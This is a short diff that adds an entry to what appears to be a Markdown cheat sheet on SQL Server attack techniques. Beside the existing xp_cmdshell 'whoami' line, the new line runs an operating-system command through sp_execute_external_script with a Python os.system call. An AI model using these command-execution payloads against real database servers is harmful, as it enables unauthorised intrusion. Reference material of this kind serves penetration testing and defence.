@@ -362,6 +362,9 @@ GO
 -- Run Commands
 xp_cmdshell 'whoami'
 GO
+
+-- Run external scripts
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
 ```
 
 - Read and write files on server.
